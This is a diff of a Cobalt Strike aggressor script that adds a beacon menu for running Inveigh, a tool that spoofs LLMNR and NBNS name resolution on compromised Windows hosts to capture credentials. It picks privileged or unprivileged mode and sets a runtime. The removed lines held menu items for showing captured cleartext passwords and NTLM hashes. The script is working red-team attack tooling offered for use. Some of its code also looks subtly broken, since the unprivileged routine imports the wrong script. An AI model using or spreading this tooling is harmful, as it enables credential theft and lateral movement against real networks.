@@ -1,82 +1,42 @@
 # Adds menu driven support for inveigh
-# No HTTPS, Inveigh-Relay or Inveigh-Bruteforce support at this time
 # @Und3rf10w
 
-
-# TODO:
-	# Successful command I executed was:
-	# 	powershell-import Inveigh-Unprivileged.ps1
-	#	powershell Invoke-InveighUnprivileged -ConsoleOutput N -RunTime 10 -Tool 2 -LLMNR Y -NBNS Y
-	# I assume that I can do the same for the Inveigh.ps1
 # TODO: 
-#	* 1st phase: build out a weaksauce menu select for unprivileged and privileged inveigh. Prompt for Runtime
-#	* 2nd phase: build out a proper Java Swing menu to customize the options for unprivileged and privileged inveigh
+#	* build out a proper Java Swing menu to customize the options for unprivileged and privileged inveigh
 
-sub invoke-inveigh {
-	# $1 = ID of beacon
-	# $2 = IP of beacon
+
+sub runPrivilegedInveigh {
+	$bid =  $1;
 	binput($1, "powershell-import " . script_resource("inveigh/Scripts/Inveigh.ps1"));
 	bpowershell_import($1, script_resource("inveigh/Scripts/Inveigh.ps1"));
-	binput($1, "powershell Invoke-Inveigh -IP " . $2 . " -Tool 1 -NBNS Y");
-	bpowershell($1, "Invoke-Inveigh -IP " . $2 . " -Tool 1 -NBNS Y");
-	bnote($1, "Active Inveigh Listener");
+	prompt_text("How long would you like to run Inveigh (in minutes)?", "15", {
+		binput($bid, "powershell Invoke-Inveigh -ConsoleOutput N -RunTime $1 -Tool 2 -LLMNR Y -NBNS Y -StatusOutput Y");
+		bpowershell($bid, "Invoke-Inveigh -ConsoleOutput N -RunTime $1 -Tool 2 -LLMNR Y -NBNS Y -StatusOutput Y");
+	});
+}
+
+sub runUnPrivilegedInveigh {
+	$bid = $1;
+	binput($1, "powershell-import " . script_resource("inveigh/Scripts/Inveigh.ps1"));
+	bpowershell_import($1, script_resource("inveigh/Scripts/Inveigh.ps1"));
+	prompt_text("How long would you like to run Inveigh (in minutes)?", "15", {
+		binput($bid, "powershell Invoke-InveighUnprivileged -ConsoleOutput N -RunTime $1 -Tool 2 -LLMNR Y -NBNS Y -StatusOutput Y");
+		bpowershell($bid, "Invoke-InveighUnprivileged -ConsoleOutput N -RunTime $1 -Tool 2 -LLMNR Y -NBNS Y -StatusOutput Y");
+	});
 }
 
 popup beacon_bottom {
 	menu "Inveigh"{
-		item "Start Inveigh Listener" {
-			# Load and execute specifying a specific local listening/spoofing IP using default settings
-			# Prompt user to confirm that the IP address for the beacon is correct.
-			local('$bid');
+		item "Run Inveigh"{
+			local('$bid')
 			foreach $bid ($1){
-				$beacon_ip = binfo($bid, 'internal');
-				$beacon_id = binfo($bid, 'id');
-				prompt_text("What is the internal IP address of this beacon?", "$beacon_ip", {
-					invoke-inveigh($beacon_id, $1);
-				});
-			}
-		}
-		item "Stop Inveigh Listener" {
-			# Stops Inveigh listener for specified beacon session
-			local('$bid');
-			foreach $bid ($1) {
-				binput($bid, "powershell Stop-Inveigh");
-				bpowershell($bid, 'Stop-Inveigh');
-				bnote($bid, "");
-			}
-		}
-		menu "Inveigh Listener" {
-			# Use this menu to get the queued output of the Inveigh listener
-			item "Listener Stats" {
-				# Shows statistics for the Inveigh Listener
-				local('$bid');
-				foreach $bid ($1) {
-					binput($bid, "powershell Get-InveighStat")
-					bpowershell($bid, "Get-InveighStat")
+				if (-isadmin $bid){
+					blog($1, "Beacon is admin, running privileged Inveigh");
+					runPrivilegedInveigh($bid);
 				}
-			}
-			item "Show Inveigh Queued Output" {
-				# Runs Get-Inveigh, grabbing all queued output
-				local('$bid');
-				foreach $bid ($1) {
-					binput($bid, "powershell Get-Inveigh");
-					bpowershell($bid, "Get-Inveigh");
-				}
-			}
-			item "Show Captured Cleartext Credentials"{
-				# Runs Get-InveighCleartext, showing all cleartext captured credentials
-				local('$bid');
-				foreach $bid ($1) {
-					binput($bid, "powershell Get-InveighCleartext");
-					bpowershell($bid, "Get-InveighCleartext");
-				}
-			}
-			item "Show Captured NTLM Hashes" {
-				# Runs Get-InveighNTLM, showing all captured challenge/response hashes, v1 and v2
-				local('$bid');
-				foreach $bid ($1) {
-					binput($bid, "powershell Get-InveighNTLM");
-					bpowershell($bid, "Get-InveighNTLM");
+				else {
+					blog($1, "Beacon is not admin, running unprivileged Inveigh");
+					runUnPrivilegedInveigh($bid);
 				}
 			}
 		}
